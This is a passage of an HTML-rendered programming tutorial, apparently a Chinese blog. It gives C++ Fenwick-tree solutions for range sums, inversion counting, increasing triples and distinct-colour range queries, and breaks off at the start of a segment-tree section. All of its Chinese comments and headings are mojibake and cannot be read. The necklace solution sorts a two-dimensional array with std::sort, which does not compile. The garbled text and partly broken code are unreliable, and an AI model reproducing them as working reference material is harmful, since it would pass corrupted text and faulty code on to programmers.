class="hljs-number">1</span>) &#123;&#125; <span class="hljs-comment">// åˆå§‹åŒ–å¤§å°ä¸º n+1 çš„æ ‘çŠ¶æ•°ç»„</span><br>    <br>    <span class="hljs-type">void</span> <span class="hljs-title function_">upd</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> d)</span> &#123; <span class="hljs-comment">// å•ç‚¹æ›´æ–°ï¼Œå°†ç´¢å¼• i å¢åŠ  d</span><br>        <span class="hljs-keyword">for</span> (++i; i &lt; t.size(); i += i &amp; -i) t[i] += d;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123; <span class="hljs-comment">// æŸ¥è¯¢å‰ i é¡¹çš„å‰ç¼€å’Œ</span><br>        <span class="hljs-type">int</span> s = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (++i; i &gt; <span class="hljs-number">0</span>; i -= i &amp; -i) s += t[i];<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <br>    <span class="hljs-type">int</span> <span class="hljs-title function_">qry</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123; <span class="hljs-comment">// æŸ¥è¯¢åŒºé—´ [l, r] çš„åŒºé—´å’Œ</span><br>        <span class="hljs-keyword">return</span> qry(r) - qry(l - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, q;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; q;<br>    FenwickTree <span class="hljs-title function_">t</span><span class="hljs-params">(n)</span>;<br>    <br>    <span class="hljs-keyword">while</span> (q--) &#123;<br>        <span class="hljs-type">int</span> op;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; op;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// æ“ä½œ 1: å•ç‚¹æ›´æ–°</span><br>            <span class="hljs-type">int</span> i, d;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; i &gt;&gt; d;<br>            t.upd(i, d);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>) &#123; <span class="hljs-comment">// æ“ä½œ 2: æŸ¥è¯¢åŒºé—´å’Œ</span><br>            <span class="hljs-type">int</span> l, r;<br>            <span class="hljs-built_in">cin</span> &gt;&gt; l &gt;&gt; r;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; t.qry(l, r) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç»Ÿè®¡é€†åºå¯¹"><a href="#ç»Ÿè®¡é€†åºå¯¹" class="headerlink" title="ç»Ÿè®¡é€†åºå¯¹"></a>ç»Ÿè®¡é€†åºå¯¹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">500001</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; t;<br>    FenwickTree(<span class="hljs-type">int</span> n) : t(n + <span class="hljs-number">1</span>) &#123;&#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> v)</span> &#123;<br>        <span class="hljs-keyword">for</span> (++i; i &lt; t.size(); i += i &amp; -i) &#123;<br>            t[i] += v;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">long</span> s = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (++i; i &gt; <span class="hljs-number">0</span>; i -= i &amp; -i) &#123;<br>            s += t[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br>    <br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span>, alls;  <span class="hljs-comment">// ç”¨æ¥å­˜å‚¨æ‰€æœ‰å¾…ç¦»æ•£åŒ–çš„å€¼</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>        alls.push_back(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// ç¦»æ•£åŒ–çš„å¤„ç†</span><br>    sort(alls.begin(), alls.end());<br>    alls.erase(unique(alls.begin(), alls.end()), alls.end()); <span class="hljs-comment">// å»é‡</span><br><br>    <span class="hljs-comment">// äºŒåˆ†æŸ¥æ‰¾æ‰¾ç¬¬ä¸€ä¸ªå¤§äºç­‰äºxçš„ä½ç½®ï¼Œæ˜ å°„åˆ°1, 2, ..., n</span><br>    <span class="hljs-keyword">auto</span> find = [&amp;](<span class="hljs-type">int</span> x) &#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>            <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>            <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// è¿”å›æ–°çš„ä¸‹æ ‡æ˜ å°„</span><br>    &#125;;<br><br>    <span class="hljs-comment">// å°†åŸæ•°ç»„ä¸­çš„å€¼ç¦»æ•£åŒ–</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        arr[i] = find(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// Fenwick Tree ç”¨äºæ±‚è§£é€†åºå¯¹</span><br>    FenwickTree <span class="hljs-title function_">fenwick</span><span class="hljs-params">(alls.size())</span>;<br>    <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        ans += fenwick.sum(arr[i] - <span class="hljs-number">1</span>);<br>        fenwick.add(arr[i], <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å‡åºä¸‰å…ƒç»„"><a href="#å‡åºä¸‰å…ƒç»„" class="headerlink" title="å‡åºä¸‰å…ƒç»„"></a>å‡åºä¸‰å…ƒç»„</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">30001</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FenwickTree</span> &#123;</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt; tree1, tree2;<br>    <span class="hljs-type">int</span> m;<br><br>    FenwickTree(<span class="hljs-type">int</span> size) : tree1(size + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), tree2(size + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), m(size) &#123;&#125;<br><br>    <span class="hljs-type">int</span> <span class="hljs-title function_">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">return</span> i &amp; -i;<br>    &#125;<br><br>    <span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&amp; tree, <span class="hljs-type">int</span> i, <span class="hljs-type">long</span> c)</span> &#123;<br>        <span class="hljs-keyword">while</span> (i &lt;= m) &#123;<br>            tree[i] += c;<br>            i += lowbit(i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&amp; tree, <span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>            ans += tree[i];<br>            i -= lowbit(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(MAXN)</span>, <span class="hljs-title function_">sorted_arr</span><span class="hljs-params">(MAXN)</span>, alls; <span class="hljs-comment">// `alls` ç”¨æ¥å­˜å‚¨æ‰€æœ‰å¾…ç¦»æ•£åŒ–çš„å€¼</span><br><br><span class="hljs-comment">// äºŒåˆ†æŸ¥æ‰¾å¹¶è¿”å›ç¦»æ•£åŒ–åçš„ä¸‹æ ‡</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = alls.size() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (l &lt; r) &#123;<br>        <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (alls[mid] &gt;= x) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> r + <span class="hljs-number">1</span>; <span class="hljs-comment">// æ˜ å°„åˆ° 1, 2, ..., n</span><br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">compute</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰å¾…ç¦»æ•£åŒ–çš„å€¼</span><br>    alls.clear();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        alls.push_back(arr[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// ç¦»æ•£åŒ–ï¼šæ’åºå¹¶å»é‡</span><br>    sort(alls.begin(), alls.end());<br>    alls.erase(unique(alls.begin(), alls.end()), alls.end());<br><br>    <span class="hljs-comment">// ç¦»æ•£åŒ–åŸæ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        arr[i] = find(arr[i]); <span class="hljs-comment">// ä½¿ç”¨ `find` å‡½æ•°è·å–ç¦»æ•£åŒ–çš„å€¼</span><br>    &#125;<br><br>    FenwickTree <span class="hljs-title function_">fenwick</span><span class="hljs-params">(alls.size())</span>; <span class="hljs-comment">// ä½¿ç”¨æ–°çš„ç¦»æ•£åŒ–å¤§å°</span><br>    <span class="hljs-type">long</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-type">long</span> right_count = fenwick.sum(fenwick.tree2, arr[i] - <span class="hljs-number">1</span>);<br>        ans += right_count;<br><br>        fenwick.add(fenwick.tree1, arr[i], <span class="hljs-number">1</span>);<br>        <span class="hljs-type">long</span> one_count = fenwick.sum(fenwick.tree1, arr[i] - <span class="hljs-number">1</span>);<br>        fenwick.add(fenwick.tree2, arr[i], one_count);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">cin</span>.tie(nullptr);<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>    &#125;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; compute() &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="hhçš„é¡¹é“¾"><a href="#hhçš„é¡¹é“¾" class="headerlink" title="hhçš„é¡¹é“¾"></a>hhçš„é¡¹é“¾</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1000001</span>;<br><br><span class="hljs-type">int</span> arr[MAXN];       <span class="hljs-comment">// å­˜å‚¨åŸæ•°ç»„</span><br><span class="hljs-type">int</span> query[MAXN][<span class="hljs-number">3</span>];  <span class="hljs-comment">// å­˜å‚¨æŸ¥è¯¢ [l, r, index]</span><br><span class="hljs-type">int</span> ans[MAXN];       <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªæŸ¥è¯¢çš„ç»“æœ</span><br><span class="hljs-type">int</span> <span class="hljs-built_in">map</span>[MAXN];       <span class="hljs-comment">// å­˜å‚¨æ¯ä¸ªé¢œè‰²æœ€åå‡ºç°çš„ä½ç½®</span><br><span class="hljs-type">int</span> tree[MAXN];      <span class="hljs-comment">// æ ‘çŠ¶æ•°ç»„</span><br><br><span class="hljs-type">int</span> n, m;<br><br><span class="hljs-comment">// æ ‘çŠ¶æ•°ç»„çš„ lowbit å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-keyword">return</span> i &amp; -i;<br>&#125;<br><br><span class="hljs-comment">// æ›´æ–°æ ‘çŠ¶æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> v)</span> &#123;<br>    <span class="hljs-keyword">while</span> (i &lt;= n) &#123;<br>        tree[i] += v;<br>        i += lowbit(i);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æŸ¥è¯¢ 1~i çš„åŒºé—´å’Œ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &gt; <span class="hljs-number">0</span>) &#123;<br>        ans += tree[i];<br>        i -= lowbit(i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">// è®¡ç®—æŸ¥è¯¢åŒºé—´çš„å’Œ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> &#123;<br>    <span class="hljs-keyword">return</span> sum(r) - sum(l - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// å¤„ç†æ‰€æœ‰æŸ¥è¯¢</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">compute</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// æŒ‰ç…§æŸ¥è¯¢çš„å³ç«¯ç‚¹æ’åº</span><br>    sort(query + <span class="hljs-number">1</span>, query + m + <span class="hljs-number">1</span>, [](<span class="hljs-type">const</span> <span class="hljs-type">int</span> a[], <span class="hljs-type">const</span> <span class="hljs-type">int</span> b[]) &#123;<br>        <span class="hljs-keyword">return</span> a[<span class="hljs-number">1</span>] &lt; b[<span class="hljs-number">1</span>];<br>    &#125;);<br><br>    <span class="hljs-comment">// ç»´æŠ¤ä»1åˆ°å½“å‰å³ç«¯ç‚¹çš„åŒºé—´</span><br>    <span class="hljs-type">int</span> s = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> q = <span class="hljs-number">1</span>; q &lt;= m; q++) &#123;<br>        <span class="hljs-type">int</span> l = query[q][<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> r = query[q][<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> i = query[q][<span class="hljs-number">2</span>];<br><br>        <span class="hljs-comment">// æ›´æ–°æ ‘çŠ¶æ•°ç»„ï¼Œå°† [s, r] èŒƒå›´å†…çš„å…ƒç´ åŠ åˆ°æ ‘çŠ¶æ•°ç»„ä¸­</span><br>        <span class="hljs-keyword">while</span> (s &lt;= r) &#123;<br>            <span class="hljs-type">int</span> color = arr[s];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>[color] != <span class="hljs-number">0</span>) &#123;<br>                add(<span class="hljs-built_in">map</span>[color], <span class="hljs-number">-1</span>);  <span class="hljs-comment">// ç§»é™¤ä¹‹å‰å‡ºç°çš„é¢œè‰²çš„å½±å“</span><br>            &#125;<br>            add(s, <span class="hljs-number">1</span>);  <span class="hljs-comment">// æ·»åŠ å½“å‰å€¼åˆ°æ ‘çŠ¶æ•°ç»„</span><br>            <span class="hljs-built_in">map</span>[color] = s;  <span class="hljs-comment">// æ›´æ–°é¢œè‰²çš„æœ€åå‡ºç°ä½ç½®</span><br>            s++;<br>        &#125;<br><br>        <span class="hljs-comment">// è®¡ç®—å½“å‰æŸ¥è¯¢åŒºé—´ [l, r] çš„ç­”æ¡ˆ</span><br>        ans[i] = range(l, r);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n;<br><br>    <span class="hljs-comment">// è¾“å…¥æ•°ç»„</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; arr[i];<br>    &#125;<br><br>    <span class="hljs-built_in">cin</span> &gt;&gt; m;<br><br>    <span class="hljs-comment">// è¾“å…¥æŸ¥è¯¢</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; query[i][<span class="hljs-number">0</span>] &gt;&gt; query[i][<span class="hljs-number">1</span>];<br>        query[i][<span class="hljs-number">2</span>] = i;  <span class="hljs-comment">// å­˜å‚¨æŸ¥è¯¢çš„åŸå§‹ä½ç½®</span><br>    &#125;<br><br>    compute();<br><br>    <span class="hljs-comment">// è¾“å‡ºæ‰€æœ‰æŸ¥è¯¢çš„ç­”æ¡ˆ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; ans[i] &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="åä¸‰-çº¿æ®µæ ‘"><a href="#åä¸‰-çº¿æ®µæ ‘" class="headerlink" title="åä¸‰.çº¿æ®µæ ‘"></a>åä¸‰.çº¿æ®µæ ‘</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 